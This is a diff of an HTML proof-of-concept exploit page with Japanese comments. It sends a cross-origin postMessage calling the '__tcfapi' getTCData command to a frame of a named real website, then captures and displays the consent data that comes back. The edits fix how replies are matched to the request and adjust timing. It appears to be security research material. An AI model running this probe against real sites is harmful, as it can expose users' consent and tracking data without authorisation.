@@ -10,12 +10,13 @@
 
   <script>
     const targetFrame = document.getElementById("targetFrame");
+    const callId = "exploit-" + Date.now();
 
     // 応答受信
     window.addEventListener("message", (event) => {
       try {
         const data = JSON.parse(event.data);
-        if (data.__tcfapiReturn) {
+        if (data.__tcfapiReturn && data.__tcfapiReturn.callId === callId) {
           console.log("✅ Received __tcfapiReturn:", data.__tcfapiReturn);
           alert("✅ __tcfapiReturn received:\n" + JSON.stringify(data.__tcfapiReturn, null, 2));
         }
@@ -30,12 +31,13 @@
         __tcfapiCall: {
           command: "getTCData",
           version: 2,
-          callbackId: "exploit-123"
+          parameter: null,
+          callId: callId
         }
       };
       targetFrame.contentWindow.postMessage(JSON.stringify(msg), "https://www.socialdeal.nl");
       console.log("PoC message sent:", msg);
-    }, 5000);
+    }, 6000);  // 5秒より少し長めがおすすめ
   </script>
 </body>
 </html>
